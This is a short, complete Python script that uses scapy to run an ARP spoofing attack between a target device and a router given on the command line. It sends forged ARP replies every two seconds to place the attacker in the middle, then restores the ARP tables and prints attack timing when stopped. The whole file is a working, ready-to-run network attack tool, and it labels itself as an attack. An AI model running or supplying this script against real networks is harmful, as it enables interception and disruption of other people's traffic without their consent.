#!/usr/bin/env python

import time
import datetime
import scapy.all as scapy
import optparse
hozir = datetime.datetime.now()

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-d", "--device", dest="device_ip", help="enter ip address:")
    parser.add_option("-r", "--router", dest="router_ip", help=" Enter the router IP")
    (options,arguments) = parser.parse_args()

    return options
options = get_arguments()

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broatcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    arp_request_broatcast = broatcast/arp_request
    answered = scapy.srp(arp_request_broatcast, timeout=1, verbose=False)[0]
    return answered[0][1].hwsrc


def spoof(target_ip, spoof_ip):

    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(dest_ip, sourse_ip):
    dest_mac = get_mac(dest_ip)
    sourse_mac = get_mac(sourse_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=sourse_ip, hwsrc=sourse_mac)
    scapy.send(packet, count=4, verbose=False)




try:
    sent_packet = 0
    while True:
        spoof(options.router_ip, options.device_ip)
        spoof(options.device_ip, options.router_ip)
        sent_packet = sent_packet + 2
        print("\r[+] packet sent :", str(sent_packet), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C ...Resetting ARP tables ... Please wait. \n")
    restore(options.device_ip, options.router_ip)
    restore(options.router_ip, options.device_ip)
    end = datetime.datetime.now()
    duretion = end - hozir
    print("- Total ARP send:", sent_packet)
    print("- The attack started:", hozir)
    print("- The attack stopped:", end)
    print("- The attack time continued:", duretion)
